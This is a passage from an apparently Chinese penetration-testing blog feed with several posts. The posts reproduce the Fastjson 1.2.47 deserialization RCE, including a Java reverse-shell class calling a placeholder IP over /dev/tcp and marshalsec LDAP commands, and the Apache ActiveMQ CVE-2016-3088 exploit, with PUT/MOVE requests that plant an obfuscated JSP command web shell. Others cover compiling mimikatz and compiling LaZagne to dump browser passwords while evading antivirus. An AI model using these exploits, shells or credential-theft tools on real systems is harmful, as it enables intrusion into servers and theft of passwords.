href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX" title="获取已控机器本地保存的RDP密码" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是DPAPI&quot;&gt;&lt;a href=&quot;#什么是DPAPI&quot; class=&quot;headerlink&quot; title=&quot;什么是DPAPI&quot;&gt;&lt;/a&gt;什么是DPAPI&lt;/h1&gt;&lt;p&gt;DPAPI(Data Protection Application Programming 
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson&lt;=1.2.47 反序列化漏洞</title>
    <link href="http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-反序列化漏洞/</id>
    <published>2020-06-22T10:01:18.000Z</published>
    <updated>2020-06-22T10:25:28.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>fastjson-1.2.47</li><li>jdk-8u181-linux-x64.tar.gz</li><li>marshalsec-0.0.3-SNAPSHOT-all.jar</li><li>tomcat8.35</li></ul><p>可以用P神的vulhub和docker搭建，这里我尝试搭建了好久报错，就还是自己手工搭建吧。</p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dajian.png" alt><br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/test.png" alt></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们可以利用DNSLOG进行漏洞探测：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://q0qdv.l.dnslog.io/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dnslog.png" alt></p><p>但是好像只能打一次，过一会就不能打了。</p><p>接下来我们反弹shell：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx.xxx.xxx.xxx/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>将以上代码保存为Exploit.java，然后javac编译成class，编译好之后上传服务器，在该目录下启用python http服务：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7000</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/7000.png" alt></p><p>开启nc监听，上面的代码中监听的12345：<br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/nc.png" alt></p><p>使用marshalsec工具快捷的开启LDAP服务：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xxx.xxx.xxx.xxx:7000/#Exploit 7500</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/marshalsec.png" alt></p><p>一共开启了三个监听，最后我们发送payload：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://xxxxxx:7000/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>shell就可以弹回来了，但是一个ip只可以利用一次。</p><p>还需要注意jdk的版本。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;fastjson-1.2.47&lt;/li&gt;
&lt;li&gt;jdk-8u181-linux-x64.tar.gz&lt;/li&gt;
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>JAVA反射学习代码</title>
    <link href="http://sherlocz.github.io/2020/05/28/JAVA%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/"/>
    <id>http://sherlocz.github.io/2020/05/28/JAVA反射学习代码/</id>
    <published>2020-05-28T03:07:45.000Z</published>
    <updated>2020-05-28T03:09:09.970Z</updated>
    
    <content type="html"><![CDATA[<p>看这个：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null);</span><br><span class="line">        //System.out.println(runtime.getClass().getName());</span><br><span class="line">        </span><br><span class="line">    Runtime.class.getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;notepad.exe&quot;);</span><br><span class="line">    </span><br><span class="line">        System.out.println(runtime.getClass());</span><br><span class="line">        </span><br><span class="line">        System.out.println(Class.forName(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        </span><br><span class="line">        System.out.println(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>输出结果：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br></pre></td></tr></table></div></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看这个：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;div class=&quot;mdui-table-fluid theme-post__card__table--flat&quot;&gt;&lt;table class=&quot;mdui-table mdui-table-h
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz编译</title>
    <link href="http://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/"/>
    <id>http://sherlocz.github.io/2020/05/20/mimikatz编译/</id>
    <published>2020-05-20T10:50:45.000Z</published>
    <updated>2020-07-09T08:45:06.457Z</updated>
    
    <content type="html"><![CDATA[<p>我真的是菜死了，编译都不会妈鸭</p><p>主要是vs的问题<br><img src="/2020/05/20/mimikatz编译/download.png" alt><br>把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错误。<br>编译时候设置如下：<br><img src="/2020/05/20/mimikatz编译/1.png" alt><br><img src="/2020/05/20/mimikatz编译/2.png" alt><br>然后就可以编译了，问题不大。</p><p>拜</p><p>写文章越来越水啦</p><p>日，图片显示不出来 淦</p><p>好了好了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我真的是菜死了，编译都不会妈鸭&lt;/p&gt;
&lt;p&gt;主要是vs的问题&lt;br&gt;&lt;img src=&quot;/2020/05/20/mimikatz编译/download.png&quot; alt&gt;&lt;br&gt;把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LaZagne编译抓取浏览器密码</title>
    <link href="http://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/"/>
    <id>http://sherlocz.github.io/2020/05/12/LaZagne编译抓取浏览器密码/</id>
    <published>2020-05-12T11:33:08.000Z</published>
    <updated>2020-05-12T11:50:01.140Z</updated>
    
    <content type="html"><![CDATA[<p>其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下</p><ul><li>下载地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li><li>编译文档：<a href="https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile</a></li><li>编译好的exe下载：<a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases</a></li></ul><h1 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h1><p>首先将LaZagne源码下载下来，然后安装我们需要的python第三方库：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/install.jpg" alt></p><p>安装pyinstaller：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/pyinstaller.jpg" alt></p><p>利用pyinstaller编译：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile -w lazagne.spec</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/success.jpg" alt></p><p>编译成功之后会在dist文件中生成LaZagne.exe</p><p>抓取浏览器密码<br><img src="/2020/05/12/LaZagne编译抓取浏览器密码/browsers.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载地址：&lt;a href=&quot;https://github.com/AlessandroZ/LaZagne&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Apache ActiveMQ 远程代码执行漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/</id>
    <published>2020-04-18T06:01:53.000Z</published>
    <updated>2020-04-18T06:38:56.388Z</updated>
    
    <content type="html"><![CDATA[<ul><li>漏洞编号：CVE-2016-3088</li><li>利用条件：需要登录在admin或者api中，默认密码为admin<br><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png" alt></li></ul><p>首先获取当前路径：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/home.png" alt></p><p>然后使用PUT方式写入文件到fileserver这个路径下：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Host: xxxxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=18wh2ode441ry1g7stwirxxm0v</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3052</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/content.png" alt></p><p>由于在fileserver这个路径下无法解析，我们接下来要使用MOVE方式移动到web能解析的目录下：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Destination: file:///C:/apache-activemq-5.4.3/webapps/admin/sys1.jsp</span><br><span class="line">Host: xxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1pyt7l1je0zt0oka428srh0r6</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/success.png" alt><br>注意有三个回车在最后鸭</p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/admin.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;漏洞编号：CVE-2016-3088&lt;/li&gt;
&lt;li&gt;利用条件：需要登录在admin或者api中，默认密码为admin&lt;br&gt;&lt;img src=&quot;/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png&quot; alt&gt;&lt;/li&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>应急响应基础知识和命令</title>
    <link href="http://sherlocz.github.io/2020/03/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E5%91%BD%E4%BB%A4/"/>
    <id>http://sherlocz.github.io/2020/03/24/应急响应基础知识和命令/</id>
    <published>2020-03-24T09:42:22.000Z</published>
    <updated>2020-03-26T06:32:49.989Z</updated>
    
    <content type="html"><![CDATA[<p>最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。</p><p>好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一些基础的命令、工具和词汇。</p><p>应急一般会有：勒索病毒、挖矿木马、DDoS、APT攻击等。</p><p>不过主要的还是勒索和挖矿两种。</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>文件分析命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#查看tmp目录下的文件</span><br><span class="line">ls –alt /tmp/</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line"></span><br><span class="line">#按时间排序查看指定目录下的文件</span><br><span class="line">ls -alt | head -n 10</span><br><span class="line"></span><br><span class="line">#查看文件创建修改时间信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">#查看历史命令记录文件</span><br><span class="line">cat /root/.bash_history | more</span><br><span class="line"></span><br><span class="line">#查看操作系统用户信息文件/etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#查找24小时内被修改的php文件</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">#查找72小时内新增的文件</span><br><span class="line">find / -ctime 2</span><br><span class="line"></span><br><span class="line">#查找777的权限的jsp文件</span><br><span class="line">find / *.jpg -perm 4777</span><br><span class="line"></span><br><span class="line">#查看当前的任务计划有哪些</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">#查看etc目录任务计划相关文件</span><br><span class="line">ls /etc/cron*</span><br></pre></td></tr></table></div></figure></p><p>进程分析命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看本机网络连接情况</span><br><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">#根据netstat定位出pid，使用ps命令分析进程</span><br><span 